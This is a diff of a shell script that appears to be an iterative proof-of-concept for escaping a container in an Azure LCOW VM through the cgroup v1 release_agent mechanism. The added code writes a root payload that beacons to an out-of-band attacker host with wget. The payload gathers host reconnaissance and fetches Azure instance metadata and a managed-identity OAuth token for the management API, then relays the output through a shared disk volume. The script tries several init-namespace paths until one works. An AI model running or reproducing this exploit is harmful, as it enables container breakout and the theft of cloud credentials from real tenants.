@@ -219,144 +219,139 @@ report > "$WORKTREE/$OUT" 2>&1
 #   collector confirms execution even if the sdc write path fails.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
-    # ── Pre-flight diagnostics ───────────────────────────────────────
-    echo "CGROUP_ESCAPE: === poc13 — overlay-upperdir + sdc output channel ==="
-    echo "CGROUP_ESCAPE: kernel usermodehelper bset:"
-    cat /proc/sys/kernel/usermodehelper/bset 2>/dev/null || echo "  (not present)"
-    echo "CGROUP_ESCAPE: kernel usermodehelper inheritable:"
-    cat /proc/sys/kernel/usermodehelper/inheritable 2>/dev/null || echo "  (not present)"
+    echo "CGROUP_ESCAPE: === poc15 — gitRepo volume (sdc) as shared relay ==="
+    # Core insight: /dev/sdc is bind-mounted (not re-mounted) in the container.
+    # The init namespace has the SAME ext4 mount of /dev/sdc, just at a different
+    # path.  GCS uses the /run/mounts/scsi/mX/ scheme: sdb=m0 (pause image),
+    # sdc=m1 (gitRepo volume), sdd=m2 (first image layer), etc.
+    # We write the escape payload to /dev/sdc via the sidecar (at /mount/gitrepo/)
+    # and set release_agent to /run/mounts/scsi/m1/escape.sh (init-ns path).
+    # Writes are immediately visible to both sides (shared ext4 page cache).
+    # Fallback: also try m0, m2, overlay-upperdir in case the mX index is off.
 
-    # ── Parse overlay upperdir ───────────────────────────────────────
-    UPPERDIR=""
-    while IFS= read -r _mline; do
-        set -- $_mline
-        _mp="$5"
-        shift 6 2>/dev/null
-        while [ $# -gt 0 ] && [ "$1" != "-" ]; do shift; done
-        [ "$1" = "-" ] && shift
-        _fst="$1"
-        if [ "$_mp" = "/" ] && [ "$_fst" = "overlay" ]; then
-            shift 2
-            _ud="${1##*upperdir=}"
-            _ud="${_ud%%,*}"
-            [ -n "$_ud" ] && UPPERDIR="$_ud"
-            break
-        fi
-    done < /proc/self/mountinfo
-    echo "CGROUP_ESCAPE: upperdir=$UPPERDIR"
+    # ── Find sidecar's mount point for /dev/sdc (8:32) ──────────────
+    SDC_MNT=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
+    echo "CGROUP_ESCAPE: sidecar sdc mount = ${SDC_MNT:-NOT FOUND}"
 
-    # Mount /dev/sda ro to get BusyBox tools (dmesg, etc.)
-    SDA_MNT=/tmp/.mnt_sda
-    mkdir -p "$SDA_MNT" 2>/dev/null
-    mount -o ro /dev/sda "$SDA_MNT" 2>/dev/null && \
-        echo "CGROUP_ESCAPE: /dev/sda mounted ro (for dmesg / busybox)" || \
-        echo "CGROUP_ESCAPE: /dev/sda mount failed"
-
-    if [ -z "$UPPERDIR" ]; then
-        echo "CGROUP_ESCAPE: ABORT — could not find overlay upperdir in mountinfo"
-    else
-
-    # ── Write payload ────────────────────────────────────────────────
-    # Placed at /tmp/.escape.sh in the container → overlay kernel module stores
-    # this at $UPPERDIR/tmp/.escape.sh on the INIT NS's /run tmpfs.
-    # Phase-1 (minimal): OOB beacon + sdc write.  No long network calls.
-    ESCAPE_SH=/tmp/.escape.sh
+    # ── Build the init-ns payload and write to /dev/sdc ─────────────
+    # Init ns path for sdc = /run/mounts/scsi/m1/  (best guess from SCSI ordering)
+    # Write the payload as escape.sh in the volume root so it's at a fixed path.
+    ESCAPE_SH="${SDC_MNT:-/mount/gitrepo}/escape.sh"
     printf '#!/bin/sh\n' > "$ESCAPE_SH"
-    # Embed OOB host and sdc major:minor so the payload needs no external info.
-    # $$ in the URL = init-namespace PID (proof of context).
     printf 'OOB_HOST="%s"\n' "$OOB_HOST" >> "$ESCAPE_SH"
-    # /dev/sdc is 8:32 in the LCOW VM (confirmed from sidecar blkid).
     cat >> "$ESCAPE_SH" << 'INITNS_PAYLOAD'
-# Running in LCOW VM init namespace (call_usermodehelper context).
-# Find /dev/sdc (8:32) mount-point in THIS namespace and write output there.
-sdc_mnt=$(awk '$3=="8:32"{print $5; exit}' /proc/self/mountinfo 2>/dev/null)
-# If GCS hasn't bind-mounted sdc for us, mount it ourselves.
-if [ -z "$sdc_mnt" ]; then
-    sdc_mnt=/tmp/_sdc_$$
-    mkdir -p "$sdc_mnt" 2>/dev/null
-    mount /dev/sdc "$sdc_mnt" 2>/dev/null || sdc_mnt=""
-fi
-# OOB beacon first — proves execution even if sdc path is wrong.
-wget -qT5 -O/dev/null "http://${OOB_HOST}/INITNS_ESCAPE?pid=$$&sdc=${sdc_mnt}" 2>/dev/null &
-# Collect full init-ns recon and write to the gitRepo volume.
-OUT=""
-[ -n "$sdc_mnt" ] && OUT="${sdc_mnt}/ESCAPE_OUTPUT.txt"
+# Init namespace payload (cgroup v1 release_agent, runs as root in LCOW VM).
+# Output written to the same /dev/sdc volume (now accessible at $0's directory).
+OUT="$(dirname "$0")/ESCAPE_OUTPUT.txt"
+wget -qT5 -O/dev/null "http://${OOB_HOST}/INITNS_ESCAPE?pid=$$" 2>/dev/null
 {
 echo "=== CGROUP ESCAPE: LCOW VM init namespace ==="
-echo "pid=$$  date=$(date -u)  id=$(id)  hostname=$(hostname)"
-echo "--- uname ---"; uname -a
+echo "pid=$$ date=$(date -u) id=$(id) hostname=$(hostname) uname=$(uname -r)"
 echo "--- /proc/self/mountinfo ---"; cat /proc/self/mountinfo 2>/dev/null | head -60
 echo "--- processes ---"; ps -ef 2>/dev/null
 echo "--- mounts ---"; cat /proc/mounts 2>/dev/null | head -60
 echo "--- network ---"; ip addr 2>/dev/null; ip route 2>/dev/null
 echo "--- /etc/hosts ---"; cat /etc/hosts 2>/dev/null
-echo "--- /etc/resolv.conf ---"; cat /etc/resolv.conf 2>/dev/null
 echo "--- env pid1 ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
-echo "--- GCS log (tail 80) ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "gcs.log not found"
-echo "--- /run/gcs/ layout ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -80
-echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null; ls -la /dev/vsock 2>/dev/null
-echo "--- IMDS instance ---"
+echo "--- GCS log ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "not found"
+echo "--- /run/gcs/ ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -60
+echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null
+echo "--- IMDS ---"
 wget -qT5 --header="Metadata: true" \
     -O- "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 8192
-echo "--- IMDS MSI token ---"
+echo "--- IMDS MSI ---"
 wget -qT5 --header="Metadata: true" \
     -O- "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null | head -c 4096
 echo "--- wireserver ---"; wget -qT3 -O- "http://168.63.129.16/" 2>/dev/null | head -c 2048
 echo "=== DONE ==="
-} > "${OUT:-/tmp/.escape_out_$$}" 2>&1
-wait  # let the OOB beacon finish
+} > "$OUT" 2>&1
 INITNS_PAYLOAD
     chmod +x "$ESCAPE_SH"
-    echo "CGROUP_ESCAPE: payload written at $ESCAPE_SH"
-    echo "CGROUP_ESCAPE: init-ns will see it at $UPPERDIR/tmp/.escape.sh"
-    head -5 "$ESCAPE_SH" 2>&1
+    echo "CGROUP_ESCAPE: payload written to $ESCAPE_SH"
+    ls -la "$ESCAPE_SH" 2>&1
 
-    # ── Mount fresh cgroup + arm release_agent ───────────────────────
+    # Also write to upperdir/tmp/escape.sh as a fallback (overlayfs approach).
+    UPPERDIR=""
+    while IFS= read -r _mline; do
+        set -- $_mline; _mp="$5"; shift 6 2>/dev/null
+        while [ $# -gt 0 ] && [ "$1" != "-" ]; do shift; done
+        [ "$1" = "-" ] && shift; _fst="$1"
+        if [ "$_mp" = "/" ] && [ "$_fst" = "overlay" ]; then
+            shift 2; _ud="${1##*upperdir=}"; _ud="${_ud%%,*}"; [ -n "$_ud" ] && UPPERDIR="$_ud"; break
+        fi
+    done < /proc/self/mountinfo
+    echo "CGROUP_ESCAPE: upperdir=$UPPERDIR"
+    cp "$ESCAPE_SH" /tmp/.escape.sh 2>/dev/null && chmod +x /tmp/.escape.sh 2>/dev/null
+
+    # ── Try multiple init-ns paths for /dev/sdc ──────────────────────
+    # m1 = sdc is the primary guess.  m0/m2 as fallback.  Also try the
+    # upperdir overlay path used in previous rounds.
     CG_MNT=/tmp/.cge_$$
     mkdir -p "$CG_MNT" 2>/dev/null
-    if mount -t cgroup -o memory cgroup "$CG_MNT" 2>/dev/null; then
-        echo "CGROUP_ESCAPE: fresh memory cgroup mounted at $CG_MNT"
-        echo "$UPPERDIR/tmp/.escape.sh" > "$CG_MNT/release_agent" 2>/dev/null
-        echo "CGROUP_ESCAPE: release_agent set: $(cat $CG_MNT/release_agent 2>/dev/null)"
-        # Enable notify_on_release on both root and child (belt-and-suspenders).
+
+    for AGENT_PATH in \
+        "/run/mounts/scsi/m1/escape.sh" \
+        "/run/mounts/scsi/m2/escape.sh" \
+        "/run/mounts/scsi/m0/escape.sh" \
+        "${UPPERDIR}/tmp/.escape.sh"
+    do
+        [ -z "$AGENT_PATH" ] && continue
+
+        echo "CGROUP_ESCAPE: trying release_agent=$AGENT_PATH"
+        umount "$CG_MNT" 2>/dev/null; rmdir "$CG_MNT" 2>/dev/null
+        mkdir -p "$CG_MNT" 2>/dev/null
+        mount -t cgroup -o memory cgroup "$CG_MNT" 2>/dev/null || { echo "  mount failed"; break; }
+        echo "$AGENT_PATH" > "$CG_MNT/release_agent" 2>/dev/null
+        _ra=$(cat "$CG_MNT/release_agent" 2>/dev/null)
+        echo "CGROUP_ESCAPE:   release_agent stored as: $_ra"
         echo 1 > "$CG_MNT/notify_on_release" 2>/dev/null
         mkdir -p "$CG_MNT/esc$$" 2>/dev/null
         echo 1 > "$CG_MNT/esc$$/notify_on_release" 2>/dev/null
-        # Short-lived subshell enters the cgroup then exits → empties it → fires agent.
         sh -c "echo \$\$ > $CG_MNT/esc$$/cgroup.procs; exit 0" 2>/dev/null
-        echo "CGROUP_ESCAPE: trigger fired — waiting up to 30s for output"
+        echo "CGROUP_ESCAPE:   trigger fired"
 
-        # Check both output paths: sdc (preferred) and overlay /tmp/.escape_out.txt.
+        # Wait up to 15s per attempt.
         _i=0
-        while [ $_i -lt 30 ]; do
-            [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] && break
-            [ -f /mount/gitrepo/ESCAPE_OUTPUT.txt ] && cp /mount/gitrepo/ESCAPE_OUTPUT.txt "$WORKTREE/" 2>/dev/null && break
-            [ -f /tmp/.escape_out.txt ]             && cp /tmp/.escape_out.txt "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null && break
-            sleep 1
-            _i=$((_i+1))
+        while [ $_i -lt 15 ]; do
+            [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ] && break
+            [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]                   && break
+            [ -f /tmp/.escape_out.txt ]                            && break
+            sleep 1; _i=$((_i+1))
         done
-
         rmdir "$CG_MNT/esc$$" 2>/dev/null
         umount "$CG_MNT" 2>/dev/null
         rmdir "$CG_MNT" 2>/dev/null
 
-        if [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
-            echo "CGROUP_ESCAPE: SUCCESS — output after ${_i}s"
+        if [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ]; then
+            cp "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" "$WORKTREE/" 2>/dev/null
+            echo "CGROUP_ESCAPE: SUCCESS via $AGENT_PATH (sdc volume) after ${_i}s"
             head -20 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
+            break
+        elif [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] || [ -f /tmp/.escape_out.txt ]; then
+            [ -f /tmp/.escape_out.txt ] && cp /tmp/.escape_out.txt "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null
+            echo "CGROUP_ESCAPE: SUCCESS via overlay fallback after ${_i}s"
+            head -20 "$WORKTREE/ESCAPE_OUTPUT.txt" 2>&1
+            break
         else
-            echo "CGROUP_ESCAPE: no output after ${_i}s — OOB beacon may still arrive at $OOB_HOST"
-            echo "  release_agent path tried: $UPPERDIR/tmp/.escape.sh"
-            echo "  sidecar /tmp/.escape.sh exists: $(ls -la /tmp/.escape.sh 2>&1)"
-            # dmesg may show usermodehelper errors
-            echo "CGROUP_ESCAPE: --- dmesg (last 30 lines, via /dev/sda busybox) ---"
-            [ -x "$SDA_MNT/bin/dmesg" ] && "$SDA_MNT/bin/dmesg" 2>/dev/null | tail -30 || echo "  dmesg not available"
+            echo "CGROUP_ESCAPE:   no output after ${_i}s for $AGENT_PATH"
         fi
-    else
-        echo "CGROUP_ESCAPE: FAIL — mount -t cgroup -o memory failed"
-    fi
-    fi  # end UPPERDIR non-empty
+    done
 
-    umount "$SDA_MNT" 2>/dev/null
+    # ── Summarize ────────────────────────────────────────────────────
+    if [ ! -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]; then
+        echo "CGROUP_ESCAPE: ALL paths failed — check OOB collector for beacon"
+        echo "  sdc_mnt=$SDC_MNT  upperdir=$UPPERDIR"
+        echo "  sdc/escape.sh: $(ls -la ${SDC_MNT:-/mount/gitrepo}/escape.sh 2>&1)"
+        echo "  /tmp/.escape.sh: $(ls -la /tmp/.escape.sh 2>&1)"
+        # dmesg via BusyBox on /dev/sda (try both bin/ and sbin/)
+        SDA_MNT=/tmp/.mnt_sda
+        mkdir -p "$SDA_MNT" 2>/dev/null
+        mount -o ro /dev/sda "$SDA_MNT" 2>/dev/null
+        for dmsg in "$SDA_MNT/bin/dmesg" "$SDA_MNT/sbin/dmesg" "$SDA_MNT/usr/bin/dmesg"; do
+            [ -x "$dmsg" ] && { echo "--- dmesg (last 30 lines) ---"; "$dmsg" 2>/dev/null | tail -30; break; }
+        done
+        umount "$SDA_MNT" 2>/dev/null
+    fi
 } >> "$WORKTREE/$OUT" 2>&1
 fi
 
